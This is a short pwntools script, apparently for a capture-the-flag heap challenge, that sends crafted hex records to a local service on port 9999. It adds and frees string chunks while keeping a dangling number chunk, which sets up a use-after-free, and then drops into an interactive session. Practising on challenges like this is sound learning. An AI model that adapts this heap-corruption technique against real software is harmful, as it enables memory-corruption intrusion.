from pwn import *

context.log_level = 'DEBUG'
p = remote('localhost', '9999')

# ip + port + timestamp + action + str1 + str2 + str3 + str4 + num
# example: ac16ec2c0e270f0e636581d40e00030e444d30360e637300000e000000000e000000000e00000000000000780e0c
data_format = 'ac16ec2c0e270f0e636581d40e{action}0e{str1}0e{str2}0e{str3}0e{str4}0e{num}0e0c'

p.sendafter(b'data... \n', bytes.fromhex(
    data_format.format(action='0001', str1='11111111', str2='11111111', str3='11111111', str4='11111100', num='1111111111111111')
))
p.sendafter(b'data... \n', bytes.fromhex(
    data_format.format(action='0001', str1='22222222', str2='22222222', str3='22222222', str4='22222200', num='2222222222222222')
))

# 删除两个str chunk，不删除num chunk
p.sendafter(b'data... \n', bytes.fromhex(
    data_format.format(action='0002', str1='11111111', str2='11111111', str3='11111111', str4='11111100', num='3333333333333333')
))
p.sendafter(b'data... \n', bytes.fromhex(
    data_format.format(action='0002', str1='22222222', str2='22222222', str3='22222222', str4='22222200', num='3333333333333333')
))

p.sendafter(b'data... \n', bytes.fromhex(
    data_format.format(action='0001', str1='33333333', str2='33333333', str3='33333333', str4='33333333', num='0000000000000033')
))

p.interactive()